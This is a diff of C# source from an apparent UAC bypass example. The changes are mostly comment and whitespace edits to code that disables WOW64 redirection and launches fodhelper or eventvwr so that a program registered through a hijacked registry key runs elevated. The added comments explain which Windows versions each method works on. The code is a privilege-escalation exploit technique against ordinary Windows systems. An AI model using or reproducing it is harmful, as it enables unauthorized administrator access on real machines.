@@ -12,7 +12,7 @@ namespace UACBypassExample
      internal class Imports
      {
         [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern bool Wow64DisableWow64FsRedirection(out IntPtr oldValue);        
+        public static extern bool Wow64DisableWow64FsRedirection(out IntPtr oldValue);  
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern bool Wow64RevertWow64FsRedirection(IntPtr oldValue);
      }
@@ -24,6 +24,7 @@ namespace UACBypassExample
             public string RegPath;
             public string FilePath;
 
+			// initialize 
             public UACPath(string RegPath, string FilePath)
             {
                  this.RegPath = RegPath;
@@ -61,13 +62,22 @@ namespace UACBypassExample
 				  // doesn't even exists there (SysWOW64) somehow.
                   if (Imports.Wow64DisableWow64FsRedirection(out ov))
                   {
-					    // open the process to start your program in higher privileges
+					    // Open the process to start your program in higher privileges 
 					    // since both fodhelper and eventwvr will open your executable 
-					    // that is located in the registry upon execution.
+					    // that is located in the registry upon execution. 
+					   
+					    // In older Windows versions (< Windows 10). executing eventvwr will look
+					    // for the registry where the MMC executable path is located, once found
+					    // it will open MMC with eventvwr.msc to start the UI (with elevation ofc). 
+					    // In this case, you can hijack the registry to start your program in higher privileges.
+					  
+					    // But in newer versions of Windows, MMC path is now hardcoded to eventwvr itself,
+					    // so hijacking the registry and starting the program is useless. So that's why fodhelper
+					    // method is used as an alternative for newer windows versions.
                         Process.Start(new ProcessStartInfo()
                         {
                             FileName = upath[isWin10up ? 0 : 1].FilePath,
-                            CreateNoWindow = true, // optional.
+                            CreateNoWindow = true, // optional. 
                         }
 
                         ).WaitForExit();
@@ -94,6 +104,7 @@ namespace UACBypassExample
              if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
              {
                  // do something, since your process is already elevated.
+				 //    start.whatever("blah blah blah");
              }
              else
              {
